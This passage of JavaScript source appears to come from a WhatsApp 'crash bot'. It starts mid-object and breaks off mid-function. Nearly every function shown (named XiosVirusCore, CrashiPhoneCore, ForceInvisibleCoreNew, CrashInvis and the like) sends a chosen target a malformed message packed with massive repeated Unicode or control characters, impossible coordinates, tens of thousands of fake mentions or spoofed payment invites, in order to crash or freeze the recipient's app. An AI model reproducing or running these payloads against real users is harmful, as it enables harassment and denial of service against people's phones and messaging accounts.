                  "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7pK5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
                caption: "This is an ad caption",
              },
              placeholderKey: {
                remoteJid: "0@s.whatsapp.net",
                fromMe: false,
                id: "ABCDEF1234567890",
              },
              expiration: 86400,
              ephemeralSettingTimestamp: "1728090592378",
              ephemeralSharedSecret:
                "ZXBoZW1lcmFsX3NoYXJlZF9zZWNyZXRfZXhhbXBsZQ==",
              externalAdReply: {
                title: "Changli Boleh Telpon" + "\u0003".repeat(55555),
                body: "Angkat Dong" + "𑜦࣯".repeat(2000),
                mediaType: "VIDEO",
                renderLargerThumbnail: true,
                previewTtpe: "VIDEO",
                thumbnail:
                  "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7p5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
                sourceType: " x ",
                sourceId: " x ",
                sourceUrl: "https://t.me/NEWCHANGLI",
                mediaUrl: "https://t.me/NEWCHANGLI",
                containsAutoReply: true,
                renderLargerThumbnail: true,
                showAdAttribution: true,
                ctwaClid: "ctwa_clid_example",
                ref: "ref_example",
              },
              entryPointConversionSource: "entry_point_source_example",
              entryPointConversionApp: "entry_point_app_example",
              entryPointConversionDelaySeconds: 5,
              disappearingMode: {},
              actionLink: {
                url: "https://t.me/NEWCHANGLI",
              },
              groupSubject: "Example Group Subject",
              parentGroupJid: "6287888888888-1234567890@g.us",
              trustBannerType: "trust_banner_example",
              trustBannerAction: 1,
              isSampled: false,
              utm: {
                utmSource: "utm_source_example",
                utmCampaign: "utm_campaign_example",
              },
              forwardedNewsletterMessageInfo: {
                newsletterJid: "6287888888888-1234567890@g.us",
                serverMessageId: 1,
                newsletterName: " target ",
                contentType: "UPDATE",
                accessibilityText: " target ",
              },
              businessMessageForwardInfo: {
                businessOwnerJid: "0@s.whatsapp.net",
              },
              smbvampCampaignId: "smb_vamp_campaign_id_example",
              smbServerCampaignId: "smb_server_campaign_id_example",
              dataSharingContext: {
                showMmDisclosure: true,
              },
            },
          },
        },
        Ptcp
          ? {
              participant: {
                jid: target,
              },
            }
          : {}
      );
    }
    async function XiosVirusCore(target) {
      XeonBotInc.relayMessage(
        target,
        {
          extendedTextMessage: {
            text: `Changli ios` + "࣯\u0003".repeat(90000),
            contextInfo: {
              fromMe: false,
              stanzaId: target,
              participant: target,
              quotedMessage: {
                conversation: "iOS Lu Kenapa" + "\u0003".repeat(90000),
              },
              disappearingMode: {
                initiator: "CHANGED_IN_CHAT",
                trigger: "CHAT_SETTING",
              },
            },
            inviteLinkGroupTypeV2: "DEFAULT",
          },
        },
        {
          participant: {
            jid: target,
            quoted: "ChangliKing"
          },
        },
        {
          messageId: null,
        }
      );
    }
async function BlankIphoneCore(target) {
    try {
        const messsage = {
            botInvokeMessage: {
                message: {
                    newsletterAdminInviteMessage: {
                        newsletterJid: `33333333333333333@newsletter`,
                        newsletterName: "CHANGLI NO COUNTERS" + "ી".repeat(120000),
                        jpegThumbnail: "",
                        caption: "ꦽ".repeat(120000),
                        inviteExpiration: Date.now() + 1814400000,
                    },
                },
            },
        };
        await XeonBotInc.relayMessage(target, messsage, {
            userJid: target,
        });
    }
    catch (err) {
        console.log(err);
    }
}

async function InvisIphoneCore(target) {
XeonBotInc.relayMessage(
target,
{
  extendedTextMessage: {
    text: "ꦾ".repeat(55000),
    contextInfo: {
      stanzaId: target,
      participant: target,
      quotedMessage: {
        conversation: "CHANGLI CRASH IOS" + "ꦾ࣯࣯".repeat(50000),
      },
      disappearingMode: {
        initiator: "CHANGED_IN_CHAT",
        trigger: "CHAT_SETTING",
      },
    },
    inviteLinkGroupTypeV2: "DEFAULT",
  },
},
{
  paymentInviteMessage: {
    serviceType: "UPI",
    expiryTimestamp: Date.now() + 5184000000,
  },
},
{
  participant: {
    jid: target,
  },
},
{
  messageId: null,
}
);
}

async function CrashiPhoneCore(target) {
XeonBotInc.relayMessage(
target,
{
  extendedTextMessage: {
    text: `iOS Crash` + "࣯ꦾ".repeat(90000),
    contextInfo: {
      fromMe: false,
      stanzaId: target,
      participant: target,
      quotedMessage: {
        conversation: "ChangliBugs ‌" + "ꦾ".repeat(90000),
      },
      disappearingMode: {
        initiator: "CHANGED_IN_CHAT",
        trigger: "CHAT_SETTING",
      },
    },
    inviteLinkGroupTypeV2: "DEFAULT",
  },
},
{
  participant: {
    jid: target,
  },
},
{
  messageId: null,
}
);
}
async function UpiCrashCore(target) {
      await XeonBotInc.relayMessage(
        target,
        {
          paymentInviteMessage: {
            serviceType: "UPI",
            expiryTimestamp: Date.now() + 5184000000,
          },
        },
        {
          participant: {
            jid: target,
          },
        }
      );
    }

    async function VenCrashCore(target) {
      await XeonBotInc.relayMessage(
        target,
        {
          paymentInviteMessage: {
            serviceType: "VENMO",
            expiryTimestamp: Date.now() + 5184000000,
          },
        },
        {
          participant: {
            jid: target,
          },
        }
      );
    }

    async function CrashIosCore(target) {
      await XeonBotInc.relayMessage(
        target,
        {
          paymentInviteMessage: {
            serviceType: "CASHAPP",
            expiryTimestamp: Date.now() + 5184000000,
          },
        },
        {
          participant: {
            jid: target,
          },
        }
      );
    }

    async function SmCrashCore(target) {
      await XeonBotInc.relayMessage(
        target,
        {
          paymentInviteMessage: {
            serviceType: "SAMSUNGPAY",
            expiryTimestamp: Date.now() + 5184000000,
          },
        },
        {
          participant: {
            jid: target,
          },
        }
      );
    }
    async function SqCrashCore(target) {
      await XeonBotInc.relayMessage(
        target,
        {
          paymentInviteMessage: {
            serviceType: "SQUARE",
            expiryTimestamp: Date.now() + 5184000000,
          },
        },
        {
          participant: {
            jid: target,
          },
        }
      );
    }

    async function FBiphoneCore(target) {
      await XeonBotInc.relayMessage(
        target,
        {
          paymentInviteMessage: {
            serviceType: "FBPAY",
            expiryTimestamp: Date.now() + 5184000000,
          },
        },
        {
          participant: {
            jid: target,
          },
        }
      );
    }

    async function iPhoneCore(target) {
      let CrashQAiphone = "𑇂𑆵𑆴𑆿".repeat(60000);
      await XeonBotInc.relayMessage(
        target,
        {
          locationMessage: {
            degreesLatitude: 999.03499999999999,
            degreesLongitude: -999.03499999999999,
            name: CrashQAiphone,
            url: "https://t.me/NEWCHANGLI",
          },
        },
        {
          participant: {
            jid: target,
          },
        }
      );
    }
    async function ChangliIosCore(target) {
      await XeonBotInc.relayMessage(
        target,
        {
          paymentInviteMessage: {
            serviceType: "PAYPAL",
            expiryTimestamp: Date.now() + 5184000000,
          },
        },
        {
          participant: {
            jid: target,
          },
        }
      );
    }

    async function QPayStriepCore(target) {
      await XeonBotInc.relayMessage(
        target,
        {
          paymentInviteMessage: {
            serviceType: "STRIPE",
            expiryTimestamp: Date.now() + 5184000000,
          },
        },
        {
          participant: {
            jid: target,
          },
        }
      );
    }

    async function ChangliInvisIOSCore(target) {
      XeonBotInc.relayMessage(
        target,
        {
          extendedTextMessage: {
            text: "ꦾ".repeat(55000),
            contextInfo: {
              stanzaId: target,
              participant: target,
              quotedMessage: {
                conversation: "CHANGLI IOS INVISIBLE" + "ꦻ࣯࣯".repeat(50000),
              },
              disappearingMode: {
                initiator: "CHANGED_IN_CHAT",
                trigger: "CHAT_SETTING",
              },
            },
            inviteLinkGroupTypeV2: "DEFAULT",
          },
        },
        {
          paymentInviteMessage: {
            serviceType: "UPI",
            expiryTimestamp: Date.now() + 5184000000,
          },
        },
        {
          participant: {
            jid: target,
          },
        },
        {
          messageId: null,
        }
      );
    }

    //

    async function IPhoneAttackCore(target, Ptcp = true) {
      await XeonBotInc.relayMessage(
        target,
        {
          extendedTextMessage: {
            text: "CHANGLI IOS BLANK" + "ꦫꦾ".repeat(90000),
            contextInfo: {
              stanzaId: "1234567890ABCDEF",
              participant: "0@s.whatsapp.net",
              quotedMessage: {
                callLogMesssage: {
                  isVideo: true,
                  callOutcome: "1",
                  durationSecs: "0",
                  callType: "REGULAR",
                  participants: [
                    {
                      jid: "0@s.whatsapp.net",
                      callOutcome: "1",
                    },
                  ],
                },
              },
              remoteJid: target,
              conversionSource: "source_example",
              conversionData: "Y29udmVyc2lvbl9kYXRhX2V4YW1wbGU=",
              conversionDelaySeconds: 10,
              forwardingScore: 99999999,
              isForwarded: true,
              quotedAd: {
                advertiserName: "Example Advertiser",
                mediaType: "IMAGE",
                jpegThumbnail:
                  "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7pK5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
                caption: "This is an ad caption",
              },
              placeholderKey: {
                remoteJid: "0@s.whatsapp.net",
                fromMe: false,
                id: "ABCDEF1234567890",
              },
              expiration: 86400,
              ephemeralSettingTimestamp: "1728090592378",
              ephemeralSharedSecret:
                "ZXBoZW1lcmFsX3NoYXJlZF9zZWNyZXRfZXhhbXBsZQ==",
              externalAdReply: {
                title: "©De Vlaucs",
                body: "CHANGLI CRASH IOS" + "𑜦࣯".repeat(200),
                mediaType: "VIDEO",
                renderLargerThumbnail: true,
                previewTtpe: "VIDEO",
                thumbnail:
                  "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7p5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
                sourceType: " x ",
                sourceId: " x ",
                sourceUrl: "https://t.me/NEWCHANGLI",
                mediaUrl: "https://t.me/NEWCHANGLI",
                containsAutoReply: true,
                renderLargerThumbnail: true,
                showAdAttribution: true,
                ctwaClid: "ctwa_clid_example",
                ref: "ref_example",
              },
              entryPointConversionSource: "entry_point_source_example",
              entryPointConversionApp: "entry_point_app_example",
              entryPointConversionDelaySeconds: 5,
              disappearingMode: {},
              actionLink: {
                url: "https://t.me/NEWCHANGLI",
              },
              groupSubject: "Example Group Subject",
              parentGroupJid: "6287888888888-1234567890@g.us",
              trustBannerType: "trust_banner_example",
              trustBannerAction: 1,
              isSampled: false,
              utm: {
                utmSource: "utm_source_example",
                utmCampaign: "utm_campaign_example",
              },
              forwardedNewsletterMessageInfo: {
                newsletterJid: "6287888888888-1234567890@g.us",
                serverMessageId: 1,
                newsletterName: " target ",
                contentType: "UPDATE",
                accessibilityText: " target ",
              },
              businessMessageForwardInfo: {
                businessOwnerJid: "0@s.whatsapp.net",
              },
              smbcayCampaignId: "smb_cay_campaign_id_example",
              smbServerCampaignId: "smb_server_campaign_id_example",
              dataSharingContext: {
                showMmDisclosure: true,
              },
            },
          },
        },
        Ptcp
          ? {
              participant: {
                jid: target,
              },
            }
          : {}
      );
    }

    //

    async function SuperIOSCore(target) {
      XeonBotInc.relayMessage(
        target,
        {
          extendedTextMessage: {
            text: `CHANGLI 𝐼⃪𝑂⃪𝑆 -` + "࣯ꦾ".repeat(90000),
            contextInfo: {
              fromMe: false,
              stanzaId: target,
              participant: target,
              quotedMessage: {
                conversation: "𝐵⃪𝐿⃪𝐴⃪𝑁⃪𝐾 𝐼⃪𝑂⃪𝑆 ‌" + "꧒꧆".repeat(90000),
              },
              disappearingMode: {
                initiator: "CHANGED_IN_CHAT",
                trigger: "CHAT_SETTING",
              },
            },
            inviteLinkGroupTypeV2: "DEFAULT",
          },
        },
        {
          participant: {
            jid: target,
          },
        },
        {
          messageId: null,
        }
      );
    } 
    async function ForceInvisibleCoreNew(target) {
  try {
    let message = {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "HEHA",
              hasMediaAttachment: false,
              locationMessage: {
                degreesLatitude: -999.035,
                degreesLongitude: 922.999999999999,
                name: "HEHA",
                address: "\u200D",
              },
            },
            body: {
              text: "HEHA",
            },
            nativeFlowMessage: {
              messageParamsJson: "{".repeat(100000),
            },
            contextInfo: {
              participant: target,
              mentionedJid: ["0@s.whatsapp.net"],
            },
          },
        },
      },
    };

    await XeonBotInc.relayMessage(target, message, {
      messageId: null,
      participant: { jid: target },
      userJid: target,
    });
  } catch (err) {
    console.log(err);
  }
}

async function RansCrashIos(target) {
                   try {
                           const IphoneCrash = "𑇂𑆵𑆴𑆿".repeat(60000);
                           await XeonBotInc.relayMessage(target, {
                                   locationMessage: {
                                           degreesLatitude: 11.11,
                                           degreesLongitude: -11.11,
                                           name: "iOs Crash          " + IphoneCrash,
                                           url: "https://youtube.com/@mr_motu_patluby"
                                   }
                           }, {
                                   participant: {
                                           jid: target
                                   }
                           });
                           console.log("Send Bug By Rans light");
                   } catch (error) {
                           console.error("Error Sending Bug:", error);
                   }
}

async function delay(skid, mention) {
  let message = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
          fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
          fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
          mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
          mimetype: "image/webp",
          directPath:
            "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
          fileLength: { low: 1, high: 0, unsigned: true },
          mediaKeyTimestamp: {
            low: 1746112211,
            high: 0,
            unsigned: false,
          },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo: {
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                {
                  length: 40000,
                },
                () =>
                  "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
              ),
            ],
            groupMentions: [],
            entryPointConversionSource: "non_contact",
            entryPointConversionApp: "whatsapp",
            entryPointConversionDelaySeconds: 467593,
          },
          stickerSentTs: {
            low: -1939477883,
            high: 406,
            unsigned: false,
          },
          isAvatar: false,
          isAiSticker: false,
          isLottie: false,
        },
      },
    },
  };

  const msg = generateWAMessageFromContent(skid, message, {});

  await XeonBotInc.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [skid],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: skid },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });
}

async function LocaBetanew2(target) {
  try {
    let message = {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2,
          },
          interactiveMessage: {
            contextInfo: {
              mentionedJid: [target],
              isForwarded: true,
              forwardingScore: 999,
              businessMessageForwardInfo: {
                businessOwnerJid: target,
              },
            },
            body: { 
              text: `‌JAY SHREE RAM${"꧀".repeat(2500)}.com - _ #`
            },
            nativeFlowMessage: {
            messageParamsJson: "{".repeat(10000),
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: "",
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
              ],
            },
          },
        },
      },
    };

    await XeonBotInc.relayMessage(target, message, {
      participant: { jid: target },
    });
  } catch (err) {
    console.log(err);
  }
}

async function ButtonCore(target) { 
  var messageContent = generateWAMessageFromContent(target, proto.Message.fromObject({
    'viewOnceMessage': {
      'message': {
        'interactiveMessage': {
          'header': {
            'title': '',
            'subtitle': " "
          },
          'body': {
            'text': "Changli Crashers"
          },
          'footer': {
            'text': 'xp'
          },
          'nativeFlowMessage': {
            'buttons': [{
              'name': 'cta_url',
              'buttonParamsJson': "{ \"display_text\" : \"Changli Crashers\", \"url\" : \"\", \"merchant_url\" : \"\" }"
            }],
            'messageParamsJson': "{".repeat(10000000)
          }
        }
      }
    }
  }), {
    'userJid': target
  });
  await XeonBotInc.relayMessage(target, messageContent.message, { 
    'participant': {
      'jid': target
    },
    'messageId': messageContent.key.id
  });
  console.log(chalk.blue("Succes send Button Ui New 🍷"));
}
async function LocationFlowX1(target) {
try {
    let message = {
      ephemeralMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: " ",
              hasMediaAttachment: false,
              locationMessage: {
                degreesLatitude:  -999.03499999999999,
                degreesLongitude: 922.999999999999,
                name: "ꉔꁝꋬꋊꍌ꒒꒐ ꁝꋬꋪꏂꂵ",
                address: "꧀꧀꧀꧀꧀꧀꧀꧀꧀꧀",
              },
            },
            body: {
              text: " "
            },
            nativeFlowMessage: {
              messageParamsJson: "{".repeat(1000000),
            },
            contextInfo: {
              participant: target,
              mentionedJid: [
                "0@s.whatsapp.net",
                ...Array.from(
                  {
                    length: 30000,
                  },
                  () =>
                    "1" +
                    Math.floor(Math.random() * 5000000) +
                    "@s.whatsapp.net"
                ),
              ],
            },
          },
        },
      },
    };

    await XeonBotInc.relayMessage(target, message, {
      messageId: null,
      participant: { jid: target },
      userJid: target,
    });
    console.log(chalk.blue("Succes send Location Ui New 🍷"));
  } catch (err) {
    console.log(err);
  }
}
async function CrashInvis(target) {
  try {
    const coreMsg = {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              locationMessage: {
                degreesLatitude: 0,
                degreesLongitude: 0,
                name: "\u200E",
                address: "\u0007".repeat(20000),
              }
            },
            body: {
              text: "",
            },
            nativeFlowMessage: {
              messageParamsJson: "{".repeat(500000),
            }
          }
        }
      }
    };

    await XeonBotInc.relayMessage(target, coreMsg, {
      participant: { jid: target },
      messageId: undefined
    });

    const followupMsg = {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            body: {
              text: "",
              format: "DEFAULT"
            },
            nativeFlowMessage: {
              messageParamsJson: "{".repeat(100000),
              version: 3
            }
          }
        }
      }
    };

    await XeonBotInc.relayMessage(target, followupMsg, {
      participant: { jid: target }
    });

    await new Promise(resolve => setTimeout(resolve, 300));
  } catch (err) {}
}

async function ngewe(client, target)  {
const delaymention = Array.from({ length: 97410 }, (_, r) => ({
title: "📍".repeat(9741),
rows: [{ title: `${r + 1}`, id: `${r + 1}` }]
}));

const MSG = {
viewOnceMessage: {
message: {
listResponseMessage: {
title: "@YukinaDevils",
listType: 2,
buttonText: null,
sections: delaymention,
singleSelectReply: { selectedRowId: "🌀" },
contextInfo: {
mentionedJid: Array.from({ length: 97410 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
participant: target,
remoteJid: "status@broadcast",
forwardingScore: 9741,
isForwarded: true,
forwardedNewsletterMessageInfo: {
newsletterJid: "9741@newsletter",
serverMessageId: 1,
newsletterName: "-"
}
},
description: "( # )"
}
}
},
contextInfo: {
channelMessage: true,
statusAttributionType: 2
}
};

const msg = generateWAMessageFromContent(target, MSG, {});

await XeonBotInc.relayMessage("status@broadcast", msg.message, {
messageId: msg.key.id,
statusJidList: [target],
additionalNodes: [
{
tag: "meta",
attrs: {},
content: [
{
tag: "mentioned_users",
attrs: {},
content: [
{
tag: "to",
attrs: { jid: target },
content: undefined
}
]
}
]
}
]
});

if (mention) {
await XeonBotInc.relayMessage(
target,
{
statusMentionMessage: {
message: {
protocolMessage: {
key: msg.key,
type: 25
}
}
}
},
{
additionalNodes: [
{
tag: "meta",
attrs: { is_status_mention: "ゆきな - 柊🕷" },
content: undefined
}
]
}
);
}
}

exports.btnStatus = async (client, target) => {
let pesan = await generateWAMessageFromContent(true, {
buttonsMessage: {
text: "🔥",
contentText: "ゆきな - 柊🕷",
footerText: "Yukina - Hiiragi",
buttons: [
{ buttonId: ".glitch", buttonText: { displayText: "📍" + "\u0000".repeat(800000) }, type: 1 }
],
headerType: 1
}
}, {});

await XeonBotInc.relayMessage("status@broadcast", pesan.message, {
messageId: pesan.key.id,
statusJidList: [target],
additionalNodes: [
{ tag: "meta", attrs: {}, content: [{ tag: "mentioned_users", attrs: {}, content: [{ tag: "to", attrs: { jid: target }, content: undefined }] }] }
]
});

if (mention) {
await XeonBotInc.relayMessage(target, {
groupStatusMentionMessage: {
message: { protocolMessage: { key: pesan.key, type: 25 } }
}
}, {
additionalNodes: [
{ tag: "meta", attrs: { is_status_mention: "ゆきな - 柊🕷" }, content: undefined }
]
});
}
}


async function LvsCall(X) {
let InJectXploit = JSON.stringify({
status: true,
criador: "XhinSar",
resultado: {
type: "md",
ws: {
_events: {
"CB:ib,,dirty": ["Array"]
},
_eventsCount: 800000,
